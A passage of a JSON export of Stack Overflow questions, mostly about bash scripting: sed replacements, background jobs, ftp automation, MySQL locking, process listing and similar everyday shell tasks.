2.</strong></p>\n\n<p>The following query worked fine:</p>\n\n<pre><code>UPDATE wp_postmeta SET meta_value = REPLACE (  \nmeta_value,  \n'-150x150.jpg\";s:5:\"width\";s:3:\"150\";s:6:\"height\";s:3:\"150\";}',  \n'-610x200.jpg\";s:5:\"width\";s:3:\"610\";s:6:\"height\";s:3:\"200\";}');  \n</code></pre>\n\n<p>assuming original thumbnail size is 150x150 and the new size is 610x200.</p>\n"},{"tags":["linux","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":233,"score":7,"question_id":10404318,"title":"Homework: How can I log processes for auditing using the bash shell?","body":"<p>I am very new to linux and am sorry for the newbie questions.\nI had a homework extra credit question that I was trying to do but failed to get it. </p>\n\n<blockquote>\n  <p>Q. Write a security shell script that logs the following information\n  for every process: User ID, time started, time ended (0 if process is\n  still running), whether the process has tried to access a secure file\n  (stored as either yes or no)  The log created is called\n  process_security_log where each of the above pieces of information is\n  stored on a separate line and each entry follows immediately (that is,\n  there are no blank lines).  Write a shell script that will examine\n  this log and output the User ID of any process that is still running\n  that has tried to access a secure file.</p>\n</blockquote>\n\n<p>I started by trying to just capturing the User and echo it but failed.</p>\n\n<pre><code>output=`ps -ef | grep [*]`\nset -- $output\nUser=$1\necho $User\n</code></pre>\n"},{"tags":["file","bash","text","watch"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":79,"score":1,"question_id":12473004,"title":"Bash watch text file","body":"<p>I'm trying to make a small script which watches the latest log file in a folder and grabs the chat from the log, which i'll then display in a tmux panel but for some reason it can't find the file while it does exist</p>\n\n<pre><code>FILENAME=server_logs/$(ls -t1 server_logs | head -n 1)\nwatch -n3 'grep \"\\] \" '$FILENAME' | tail -n15' \n</code></pre>\n\n<p>When i run the file it gives me this grep: server_logs/server_log_09_18_12.txt : No such file or directory</p>\n\n<p>But if i use  <code>watch -n3 'grep \"\\] \" server_logs/server_log_09_18_12.txt | tail -n15'</code> it does work.\nSo my question is why can't it find the file?</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12480409,"title":"how do i execute c=bin\\jlogin -c \"exit\" $value |grep \"Error\" >>test","body":"<p>how do i execute</p>\n\n<pre><code>c=bin\\jlogin -c \"exit\" $value |grep \"Error\" &gt;&gt;test  in bash \n</code></pre>\n\n<p>i want to store the return value in c variable. $value contains some previously parsed data..i want to run the complete string as a command but when i run the shell i get an error</p>\n\n<pre><code>=bin\\jlogin command not found.\n</code></pre>\n\n<p>kidly help me what is happening and how i can solve it! searched google but it does not show results which has such complexity like user defined variables\nthanks in advance</p>\n"},{"tags":["bash","slash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":95,"score":1,"question_id":12478420,"title":"Use forward slash in variable","body":"<p>I wrote a script to ease the syncing and building of Android source. I tried adding a function to cherrypick patches, but I can't get it to work properly. I know it's because of the forward slashes, but I don't know how to protect/escape them.</p>\n\n<p>Part of the code is:</p>\n\n<pre><code>   echo \"Copy/paste the project folder, i.e. 'frameworks/base'\"\n   read folder\n   echo \"\"\n   echo \"Now paste the cherry-pick git link, i.e. 'git fetch &lt;someproject&gt; refs/changes/... &amp;&amp; git cherry-pick FETCH_HEAD'\"\n   read cherry\n   echo \"\"\n   Begin\n   clear\n   echo \"\"\n   export IFS=\"&amp;&amp;\"\n   for x in $cherry\n   do\n        cd ${CM}/${folder}\n    CHERRY=$(trim \"$x\")\n    $CHERRY\n   done\n</code></pre>\n\n<p>Let's say that the 'cherry' variable is:</p>\n\n<pre><code>git fetch http://r.cyanogenmod.com/CyanogenMod/android_frameworks_base refs/changes/68/22968/2 &amp;&amp; git cherry-pick FETCH_HEAD\n</code></pre>\n\n<p>I would get this error:</p>\n\n<pre><code>/home/tristan202/bin/build_cm.sh: line 159: git fetch http://r.cyanogenmod.com/CyanogenMod/android_frameworks_base refs/changes/91/23491/2: No such file or directory\n/home/tristan202/bin/build_cm.sh: line 159: git cherry-pick FETCH_HEAD: command not found\n</code></pre>\n\n<p>I cannot figure out why it fails.</p>\n\n<p>The 'trim' function it calls is a function that trims leading and trailing spaces. If I do echo \"$CHERRY\" within the for loop, the commands are printed correctly, but it still fails.</p>\n"},{"tags":["bash","curl"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":255,"score":1,"question_id":9512616,"title":"Post file from Bash shell script","body":"<p>I need to post a PowerPoint file to an online service which converts PPT files to PDF. I am new to Bash shell and don't know how to post PPT file from my local computer. How should I modify line below?</p>\n\n<pre><code>curl -i -H \"Accept: application/pdf\" -X POST http://do.convertapi.com/PowerPoint2Pdf &gt; output\n</code></pre>\n"},{"tags":["bash","shell","passwords","stars"],"answer_count":4,"favorite_count":3,"up_vote_count":8,"down_vote_count":0,"view_count":1370,"score":8,"question_id":1923435,"title":"How do I echo stars (*) when reading password with `read`?","body":"<p>What do I need to do for code in Bash, if I want to echo <code>*</code>s in place of password characters (or even just hide the characters completely) when the user types something in using <code>read</code>?</p>\n"},{"tags":["linux","bash","background-process"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":12479037,"title":"bash background process not working, or am I missing something?","body":"<p>I have written a script to split my pdf files between pages I give, and compress them using <code>gs</code> and then output it to a pdf file.\nI want to run my script in the background, but am I missing something? I should use <code>&amp;</code> at the end of line, but it still prints output. so I use:</p>\n\n<pre><code>./gs 12 20 temp &gt; /dev/null &amp;\n</code></pre>\n\n<p>but it just goes to the background and I should use <code>fg</code> to run it actually.\nso what is it I am missing? <code>&amp;</code> should send the process to background but it stops at background. I want it to run in background.</p>\n\n<p><strong>edit:</strong></p>\n\n<p>problem is solved. it was my mistake to look for wrong file the script creates.</p>\n\n<p>it works like a charm!</p>\n"},{"tags":["regex","bash","sed","wildcard"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":55,"score":1,"question_id":12477913,"title":"bash string replacement in a file","body":"<p>I am trying to replace some text in a file replacetest.xml</p>\n\n<p>here is the part of the file I want to modify.</p>\n\n<p><code>&lt;class name=\"replace_after_this_string\"&gt;randomtext&lt;/class&gt;</code></p>\n\n<p>I want to change the text <code>randomtext</code> with the text at the index of my array </p>\n\n<pre><code>orgs=( item1 item2 )\n</code></pre>\n\n<p>and overwrite the file with these modifications.</p>\n\n<p>My main issues are with wildcards and the <code>sed</code> command. So here is what I tried</p>\n\n<pre><code>orgs=( item1 item2 )\n\nSRC=\"name=\"'\"replace_after_this_string\"'\"&gt;\"\n#need some sort of wildcard here\n\n\nfor i in \"${orgs[@]}\"\ndo\n:\n    # do whatever on $i\n    DST=$SRC$i\n\n    sed -e 's/$SRC/$DST/g' -i replacetest.xml\n\ndone\n</code></pre>\n\n<p>1) I need a wildcard to designate that I want to replace <code>randomtext</code> after identifying what will be in the variable <code>$SRC</code></p>\n\n<p>2) My sed statement doesn't do anything except print to command line verbatim, does not modify my file at all, even in what is printed to command line</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12472404,"title":"Simulating exception-like bevaviour in bash","body":"<p>In Bash, is there some way to simulate exceptions?</p>\n\n<p>E.g. in a test function, i have several test statements</p>\n\n<pre><code>test_foo_and_bar() {\n    expect_foo $1\n    expect_bar $2\n}\n\nexpect_foo() {\n    [[ $1 != \"foo\" ]] &amp;&amp; return 1\n}\n\nexpect_bar() {\n    [[ $1 != \"bar\" ]] &amp;&amp; return 1\n}\n</code></pre>\n\n<p>Now, what I would want is that if <code>expect_foo</code> fails, execution stops and returns to the caller of function <code>test_foo_and_bar</code>.</p>\n\n<p>Is something like that possible? I know you could do something like this:</p>\n\n<pre><code>test_foo_and_bar() {\n    expect_foo $1 || return 2\n    expect_bar $2 || return 2\n}\n</code></pre>\n\n<p>But I am interested in alternative solutions (if there are any).</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>While the proposed solutions are pretty good, I have one further requirement. After an <em>exception</em> has occured, I still need to perform cleanup. So just exiting is not an option.</p>\n\n<p>What I effectivly need, in Java-speak, is some sort of <code>finally</code> clause.</p>\n"},{"tags":["linux","bash","pipe","syslog"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":128,"score":3,"question_id":12178466,"title":"pipe stderr to syslog inside automated ftp script","body":"<p>I'm using simple script to automate ftp. The script looks like this:</p>\n\n<pre><code>ftp -nv $FTP_HOST&lt;&lt;END_FTP\nuser $FTP_USER $FTP_PASS\nbinary\nmkdir $REMOTE_DIR\ncd $REMOTE_DIR\nlcd $LOCAL\nput $FILE\nbye\nEND_FTP\n</code></pre>\n\n<p>But I would like to pipe STDERR to the syslog and STDOUT to a logfile. Normally I would do something like that: <code>ftp -nv $FTP_HOST 1&gt;&gt;ftp.log | logger&lt;&lt;END_FTP</code> but in this case that won't work because of <code>&lt;&lt;END_FTP</code>. How should I do it properly to make the script work? Note that I want to redirect only output from the FTP command inside my script and not the whole script.</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12474429,"title":"Add _ to every file / Directory in folder","body":"<p>Is there a script (bash) which adds an '_' at the beginning of every file and directory name?</p>\n\n<p>Thanks for your help.</p>\n"},{"tags":["bash","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":12462625,"title":"How to print all file names in a folder with awk or bash?","body":"<p>I would like to print all file names in a folder.How can I do this with awk or bash?</p>\n"},{"tags":["bash","bash-function"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12475846,"title":"Bash's function will invoke command with quoted argument broken down?","body":"<p>Let's say I have a function in Bash:</p>\n\n<pre><code>function ll {\n    command ls -l $*\n}\n</code></pre>\n\n<p>so it is to make <code>ll</code> works like <code>ls -l</code>.  Most of the cases, it will work, but </p>\n\n<pre><code>ls -l \"ha ha\"\n</code></pre>\n\n<p>can work for the file with name <code>ha ha</code>, but </p>\n\n<pre><code>ll \"ha ha\"\n</code></pre>\n\n<p>will fail, because it is taken to be </p>\n\n<pre><code>ls -l ha ha\n</code></pre>\n\n<p>Is there a way to make this work?  I think we could have made it</p>\n\n<pre><code>function ll {\n    command ls -l \"$@\"\n}\n</code></pre>\n\n<p>(note that <code>\"$@\"</code> is different from <code>\"$*\"</code>, with <code>\"$@\"</code> meaning individually quoted, while <code>\"$*\"</code> means all quoted in one string)</p>\n\n<p>But then, <code>ll -t \"ha ha\"</code> would become <code>ls -l \"-t\" \"ha ha\"</code>, which actually works, but is kind of weird, and I am not sure if it may break down in some cases.</p>\n\n<p>Is there another way to make it work, and another thing is, I think in the function, <code>command ls -l \"$@\"</code> and <code>ls -l \"$@\"</code> is the same?  (<code>command</code> is just to run the program directly and not call any possible bash function to prevent recursion from happening?)</p>\n"},{"tags":["ruby","bash","scripting","rvm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12465166,"title":"How to load rvm with correct gemset then execute a rake task","body":"<p>Writing a script that cds into another dir, loads the correct rvm rvmrc file, then allows me to execute a rake task.</p>\n\n<p>I have the below script working on my computer, but when others pull it down to their machine they get the following error \"Ruby rvmrc is not installed\".</p>\n\n<pre><code>Bundler.with_clean_env do\n  Dir.chdir(\"../some_dir\") do\n    puts `source ~/.rvm/scripts/rvm &amp;&amp; rvm --with-rubies rvmrc exec -- rake some_task`\n  end\nend\n</code></pre>\n\n<p>I have the most up to date version of rvm (so do they) and I'm on mt.lion</p>\n\n<p>I have tried creating a bash function like so...</p>\n\n<pre><code>function foo {\n  [[ -s \"$HOME/.rvm/scripts/rvm\" ]] &amp;&amp; . \"$HOME/.rvm/scripts/rvm\" &amp;&amp; rvm use @my_gemset\n}\n</code></pre>\n\n<p>Or, replacing this line</p>\n\n<pre><code>rvm --with-rubies rvmrc exec \n</code></pre>\n\n<p>with things like...</p>\n\n<pre><code>rvm rvmrc load\nrvm use &lt;gemset&gt;\nrvm env --path -- ree-1.8.7@some_gemset\n</code></pre>\n\n<p>But none of it has worked.  Thanks for the help</p>\n"},{"tags":["linux","bash","sed","ip"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":77,"score":2,"question_id":12474172,"title":"How to find network interface name","body":"<p>I have a bash script that runs on a variety of different Ubuntu Linux machines. Its job is to find out the LAN IPv4 address of the localhost.</p>\n\n<p>The script is using </p>\n\n<pre><code>ip addr show eth0 | sed -n '/inet /{s/^.*inet \\([0-9.]\\+\\).*$/\\1/;p}'\n</code></pre>\n\n<p>which is fine, but some machines for some reason use eth1 instead of eth0. I would like to be able to discover the LAN iface name, so I can substitute it in here instead of eth0.</p>\n\n<p>Of course, if you can come up with a different oneliner that does the same thing, all good.</p>\n"},{"tags":["linux","bash","network-programming","debian"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":12475228,"title":"Creating Virtual Interface Linux","body":"<p>My goal is to simulate more than one IP interface using just a physical interface, for do that I tried using this alias</p>\n\n<pre><code>Ifconfing ethX:1 &lt;IP&gt;\n</code></pre>\n\n<p>But when I try to send a packet over that interface I see the IP source the same as the original, and real,  Ethernet interface. Then I tried to use TAP interface but I was unable to \"link\" them with my physical one, I notice them can communicate each others but can not ping (<code>ping -I tap0  &lt;ip real IF&gt;</code>) the original one.\nIt is still valid if I create a bridge with all them.</p>\n\n<p>I would like avoid to install many Virtual Box as I need but what I want is exactly what it do: build a new virtual interface and bridge it with a real one in order to have more IP interface attached at one physical.</p>\n\n<p>Any suggestions?</p>\n"},{"tags":["bash","shell"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":64,"score":0,"question_id":12169418,"title":"calculates the average value contained in a file for every 16 seconds","body":"<p>I have a big file \"values.txt\" in which there are a lot of values. These values ​​can be found in the file valeur.txt as follow :</p>\n\n<pre><code>File:  \"values.txt\"\n************************************************** *****************************************\n2\n14\n18\n20\n23\n.\n.\n.\n24\n******************************************************************************************\n</code></pre>\n\n<p>I want to write a script that calculate the average of values ​​read from the file values.txt for every 16 seconds</p>\n\n<p>i e : After each 16 seconds I will calculate the average of values ​​that I have read in the file values.txt</p>\n\n<p>for exmpl : </p>\n\n<p>To read the file \"value.txt\", we will take (16 * 4 = 64) seconds.\nSo,  when the exuction of script is finished,  it must show  4 values.  because  every 16 seconds it will calculate an average.</p>\n\n<p>I tried to do things but the concept of time (16 seconds) I still can't manage it</p>\n\n<hr>\n\n<pre><code>let \"i=0\"    \nlet\"cum=0\"\n\nwhile read var   \ndo  \nif [timer] # how I could control the period of 16 seconde ?  \nthen  \nlet \"i = i +1\"  \nlet \"cum = cum + var\"  \nelse  # 16 seconds have elapsed, so i calculate the averag   \nlet  \"avrg_var= cum /i\" \necho \"$avrg_var\"&gt;&gt; new_file.txt\nfi \ndone &lt; values.txt \n</code></pre>\n\n<hr>\n\n<p>Thank you in advance for your answers and suggestions</p>\n"},{"tags":["bash","sed"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12474287,"title":"Extract part of a log file based on time stamp","body":"<p>I have an application that appends to the same log file. As this file is rather large (around 8 gb), I'd like to extract portions based on the timestamp at the beginning of the line.</p>\n\n<pre><code>-bash-3.2$ cat application.log | egrep --color \"Starting Application|Exception\"\n08:46:01.328 [main] INFO  Starting Application...\n09:14:53.670 [Thread-1] ERROR Resolver - Caught exception -&gt; com.jgoodie.AuthzException: Authorization failed\nCaused by: com.jgoodie.AuthzException: Authorization failed\n09:56:15.739 [main] INFO  Starting Application...\n10:17:08.932 [Thread-1] ERROR Resolver - Caught exception -&gt; com.jgoodie.AuthzException: Authorization failed\nCaused by: com.jgoodie.AuthzException: Authorization failed\n</code></pre>\n\n<p>In the above example, I'd like to extract the logs for the first run of the application (between 08:46:01.328 and 09:56:15.739). Is there any simple way (preferably a one liner) to do this?</p>\n\n<p>Thanks</p>\n"},{"tags":["bash","command-line","sync","dropbox"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12460728,"title":"Recursive touch to fix syncing between computers","body":"<p>I'm looking for a way from the command-line to touch every file in a directory (and subdirectories) due to a mistake of mine a synced repo of mine has gotten a bit out of step on  my development machines. </p>\n\n<p>I've now through some unpleasant voodoo managed to get it back into a clean state on one machine, before I do the next sync, I want to prioritise everything time wise on this machine.</p>\n\n<p>Is there an easy way to touch all the files?</p>\n\n<p>Or am I better doing a manual sync of the directory?</p>\n\n<p>(I'm using dropbox for syncing for reference)</p>\n"},{"tags":["bash","script"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":394,"score":0,"question_id":7047253,"title":"echo parameters in bash","body":"<p>I'm writing a bash script but echo is taking all my parameters as string literals</p>\n\n<p>for example in this code: </p>\n\n<pre><code>echo -ne \"Hello World\"\n</code></pre>\n\n<p>produces <code>-ne Hello World</code></p>\n\n<p>How do I get it to actually use the parameters \"ne\" ?</p>\n\n<p>Cheers.</p>\n"},{"tags":["bash","shell","logging","ack"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":204,"score":3,"question_id":9625316,"title":"What color options exist for ack(-grep) for colorization of output, logs, etc?","body":"<p>Where can one find a listing of all color combinations or such available to use with <code>ack(-grep)</code>?  I find that passing logs through <code>ack-grep</code> can be quite helpful at detecting errors, warnings or various other conditions especially with colorization, however I haven't found an authoritative list of what combos may be used, etc.</p>\n\n<pre><code>tail -f development.log \\\n| ack-grep --flush --passthru --color --color-match=yellow \"^.*warning.*\"\n</code></pre>\n\n<p>I've seen options such as the standard colors: <code>red</code>, <code>blue</code>, <code>yellow</code>, <code>green</code>, etc.</p>\n\n<p>And I've seen that you can use <code>\"white on_green\"</code></p>\n\n<p>But what else?</p>\n"},{"tags":["mysql","bash"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":12461344,"title":"Avoiding MySQL read race condition in Bash script","body":"<p>I have an application to copy data off onto external disks. The copy requests are stored in a MySQL database and will be read from multiple copy machines, which run a bash script to pick up requests. Once a request is picked up, it is set as \"inprogress\" in the database. However, I'm trying to avoid a situation where multiple machines read the request close together and start copying the same data.</p>\n\n<p>I was going to use table locking to do this, but I'm struggling because a table lock expires when a session expires so if I do:</p>\n\n<pre><code>mysql=\"mysql -h dbhost -u user -pPassword diskcopydb\"\necho \"LOCK tables diskcopy WRITE;\" | $mysql\necho \"SELECT SQL_NO_CACHE * FROM diskcopy WHERE status=\\\"request\\\"\" | $mysql\n</code></pre>\n\n<p>the lock has actually expired by the time it gets to getting the requests, so the race condition persists. There is a question here:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/1324697/mysql-from-the-command-line-can-i-practically-use-locks\">MySQL from the command line - can I practically use LOCKs?</a></p>\n\n<p>where the SQL commands are packaged into a block and they are piped together into MySQL, but I need to get output from MySQL half way through to pick up the requests. Does somebody have a recipe for this? It seems like it ought to be a fairly common use-case...</p>\n"},{"tags":["bash","awk"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12469246,"title":"move files from one directory to another directory with awk or bash","body":"<p>I have a directory containing more than 1000 folders. Each folder of this directory contain one text file.I would like to move the text files from these folders to another  directory. But the name of the text file in the new directory should be the name of the folder from which it was extracted.</p>\n\n<p>How can I do this with awk or bash?</p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12472933,"title":"bash loop background job","body":"<p>I try to run a background job in a for loop in bash:</p>\n\n<pre><code>for i in $(seq 3); do echo $i ; sleep 2 &amp; ; done\n</code></pre>\n\n<p>but I get:</p>\n\n<pre><code>bash: syntax error near unexpected token `;'\n</code></pre>\n\n<p>In zsh the command line works.</p>\n\n<p>Do you have any idea.</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["bash","shell","piping"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":56,"score":1,"question_id":12469554,"title":"Piping input to a shell command and keeping the created shell alive","body":"<p>My overarching program is a shell script. This shell script calls a C program that I need to pipe input to, and ultimately the C program will create a shell.</p>\n\n<p>However, when I pipe my input into the C program within the shell script</p>\n\n<pre><code>Do_Other_Stuff\n./my_prog &lt; file1\n</code></pre>\n\n<p>I can't get the shell to stay alive. Running just,</p>\n\n<pre><code>Do_Other_Stuff\n./my_prog\n</code></pre>\n\n<p>works, as I have to input the stdin myself, and the shell correctly spawns when my_prog exits. I'm pretty sure wrapping up the ./my_prog call in a C program, and compiling and running that would work, but I'm curious as to whether there's a cleaner way with shell.</p>\n\n<p>I've tried several combinations of using <code>cat file1 | ./my_prog</code> and using <code>&amp;</code> in different situations, and haven't had any success.</p>\n\n<p>Thanks!</p>\n"},{"tags":["linux","bash","xwindows"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":2448,"score":3,"question_id":2250757,"title":"Is there a linux command to determine the window IDs associated with a given process ID?","body":"<p>Given a process iD of XX, I'd like to have a list of any window id's where _NET_WM_PID = XX.  Even better would be the oldest still active window id if possible.</p>\n\n<p>I'm very new to linux, but what I'm trying to do is create a script that would take a command line, and see if there's a windows already open belonging to a process invoked with that same command line.  If so, just set focus to that window, otherwise execute the command line to get a new process going.  My intention is to use this in my ubuntu desktop, where I'll hook this script into my easystroke mouse gesture commands, so that, for example, every time I gesture for gmail I don't get a brand new gmail session, I just get brought to my existing gmail chrome app window.  Perhaps there's a much easier way to go about all this, but I haven't found my way to it yet.</p>\n\n<p>With help, I've figured out how find a PID for a command line with pgrep and how to set focus to a window handle with wmctrl, but I'm stuck on getting from PID to window ID. </p>\n"},{"tags":["bash","selenium","phpunit","selenium-rc"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":519,"score":2,"question_id":7761679,"title":"Start Selenium RC server automatically","body":"<p>How can I automatically start and stop the Selenium RC server when I run my phpunit tests?</p>\n\n<p>I thought I could create a little bash script that does something like this (does not work though):</p>\n\n<pre><code>java -jar ~/bin/selenium-server-standalone-2.0b3.jar &amp;\nphpunit --configuration suite.xml &amp;&amp;\nkillall java\n</code></pre>\n\n<p>Surely there's a way to do that right?  To make the first line run in the background, and the second block execution until completion.</p>\n\n<p>Or is there another good way of doing this?  Does phpunit have a facility for running a process first?</p>\n\n<p>I feel like I need to completely automate this because if I forget to start the server, phpunit doesn't even throw any errors, it just skips the tests!</p>\n"},{"tags":["bash","awk"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12453936,"title":"How to move the awk outputs to a single folder?","body":"<p>I am trying to move awk output files in to a single folder.The name of each  output file should be the name of the input file. I used the following program. But this program saves each output file as \"out\" and its directory name is the name of input file. How can I change the following code to save the outputs in to a single folder with input filenames.</p>\n\n<pre><code>for i in file/*.txt;  do mkdir \"$i\"_dir;  awk -f script.awk \"$i\" &gt; \"$i\"_dir/out; done\n</code></pre>\n"},{"tags":["bash","shell","unix","ubuntu","terminal"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12468889,"title":"Bash script error: \"function: not found\". Why would this appear?","body":"<p>I'm trying to run a bash script on my Ubuntu machine and it is giving me a function not found error.</p>\n\n<p>To test, I created the following script which works fine on my laptop but not on my Desktop.  Any ideas as to why?  My laptop is a mac if that's relevant.</p>\n\n<pre><code>#!/bin/bash\n\nfunction sayIt {   \n   echo \"hello world\"\n}\n\nsayIt\n</code></pre>\n\n<p>This returns \"hello world\" on my laptop, but on my Desktop it returns:</p>\n\n<pre><code>run.sh: 3: function not found \nhello world  \nrun.sh: 5: Syntax error: \"}\" unexpected\n</code></pre>\n\n<p>Any help would be much appreciated.</p>\n"},{"tags":["bash","shell","unix","environment-variables"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12468233,"title":"print an environment variable with multi-line value in shell?","body":"<p>In Bash (or other shells) how can I print an environment variable which has a multi-line value?</p>\n\n<pre><code>text='line1\nline2'\n</code></pre>\n\n<p>I know a simple usual <code>echo $text</code> won't work out of the box. \nWould some $IFS tweak help?</p>\n\n<p>My current workaround is something like <code>ruby -e 'print ENV[\"text\"]'</code>. \nCan this be done in pure shell? I was wondering if <code>env</code> command would take an unresolved var name but it does not seem to.</p>\n"},{"tags":["bash","shell","unix"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":104,"score":1,"question_id":11228295,"title":"Trying to write a script to kill a program automatically (mac/unix - kill tomcat)","body":"<p>by hand, here is the process:</p>\n\n<p>ps -ef | grep tomcat</p>\n\n<p>The results of this look like:</p>\n\n<p>0 39107     1   0  5:40PM ttys004    5:22.34 /System/Library/Frameworks/JavaVM.framework/Versions/CurrentJDK/Home/bin/java -Djava.util.logging.config.file=/opt/local/tomcat7/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -server -Xms384m -Xmx768m -XX:NewSize=256m -XX:NewRatio=2 -XX:PermSize=128m -XX:MaxPermSize=384m -XX:+UseParNewGC -XX:+UseConcMarkSweepGC -XX:+CMSIncrementalMode -XX:+CMSIncrementalPacing -XX:+CMSClassUnloadingEnabled -Dsun.rmi.dgc.client.gcInterval=3600000 -Dsun.rmi.dgc.server.gcInterval=3600000 -Djava.endorsed.dirs=/opt/local/tomcat7/endorsed -classpath /opt/local/tomcat7/bin/bootstrap.jar:/opt/local/tomcat7/bin/tomcat-juli.jar -Dcatalina.base=/opt/local/tomcat7 -Dcatalina.home=/opt/local/tomcat7 -Djava.io.tmpdir=/opt/local/tomcat7/temp org.apache.catalina.startup.Bootstrap start</p>\n\n<p>the second number is the pid.</p>\n\n<p>Then I do</p>\n\n<p>sudo kill tomcat_pid</p>\n\n<p>How can I automate this?</p>\n\n<p>ps. I know there is a shutdown.sh script. I've tried it but it never works.</p>\n"},{"tags":["bash","shell","scripting","freebsd","lsof"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":64,"score":1,"question_id":12468629,"title":"lsof should give all open files for a set of pids","body":"<p>I have 30 instances of a process running on a server and want to log open files for each process for analysis. </p>\n\n<p>I ran the following command:</p>\n\n<pre><code>* ps auwwx | grep PROG_NAME | awk '{print $2}' | xargs lsof -p | less\n</code></pre>\n\n<p>It complaints that, <em>\"lsof: status error on : No such file or directory\"</em></p>\n\n<p>However, if I run <code>lsof -p &lt; pid &gt;</code> it gives me the list of open files for that process . How can I get a list of all open files for all 30 instances of the process on a FreeBSD machine.</p>\n\n<p>Moreover, I do not want the shared libraries to be listed. If I do <code>-d \"^txt\"</code> it isn't showing some other db files which I want to be shown. Is there any other way to grep out the .so files?</p>\n"}]}
{"total":16352,"page":20,"pagesize":100,"questions":[{"tags":["bash","if-statement"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":98,"score":0,"question_id":12468396,"title":"bash if empty string","body":"<p>Some may have found out that in Ubuntu when you install or update via terminal</p>\n\n<p>you get a question similar to </p>\n\n<blockquote>\n  <p>\"do you with to install or remove package [Y/n]?\"</p>\n</blockquote>\n\n<p>when you press enter its like its the same as when you type \"Y\" or \"y\"</p>\n\n<p>So i was wondering how to make that in bash \nThis is what i have so far?</p>\n\n<pre><code>echo \"question?[Y/n]\"\nread choose\nif [ $choose ~= \"Y\" ] [ $choose ~= \"y\" ] [ $choose ~= \"\" ]\nthen \n#code\nfi\n</code></pre>\n"},{"tags":["linux","bash","rename"],"answer_count":5,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":1251,"score":1,"question_id":2051204,"title":"bash Linux - Massive folder rename","body":"<p>On our Linux file server (RedHat Enterprise) we have some folders that we need to rename that have client work in them. The old folder format (ones that need to be changed) was <code>clientcode_jobnumberjobname</code>. The new format is <code>clientcode_jobnumber_jobname</code>. We basically need to change the old folder names by adding the extra underscore to the foldername between the <code>jobnumber</code> and <code>jobname</code>. We also have all the new folder structures that are being created to display in the new format so these will not need to be changed. The job number is always 1 letter followed by 4 numbers. The client code is 3–4 letters depending on the client. The job name is different for every job. The folders are all located at <code>clients/clientname/jobs/clientcode/\"folder that needs to be renamed\"</code> (just an example of how deep the script will have to go into the structure). It will need to do this for each <code>clientcode</code> under each client. How would I setup a script to do this? Any help would be greatly apprciated. We have thousands of these folders that we need to rename.</p>\n"},{"tags":["bash","replace","sed","awk"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":192,"score":0,"question_id":12467930,"title":"sed/awk/bash to replace text between two strings with external file contents","body":"<p>I'm looking to write a script/command, that'll take inputFile1, look for a specific start and end string in it, and replace all the text in between them\nwith the full contents of inputFile2.</p>\n\n<p>Ideally, but not mandatory, this should work without a need to escape special characters, so I can put the strings in variables that get called by the script (that way I could easily reuse it multiple times).</p>\n\n<p>As an example, I have file <em>inputYes.txt</em> with contents:</p>\n\n<pre><code>DummyOne\nStart\nThat\nWhat\nYes\nEnd\nDummyTwo\n</code></pre>\n\n<p>And <em>inputNo.txt</em> with contents:</p>\n\n<pre><code>This\nWhy\nNot\n</code></pre>\n\n<p>And I want the script to search <em>inputYes.txt</em> for the strings <em>Start</em> and <em>End</em>, and replace all the text in between with the contents of <em>inputNo.txt</em>, and write to the file.</p>\n\n<p>So after running it, 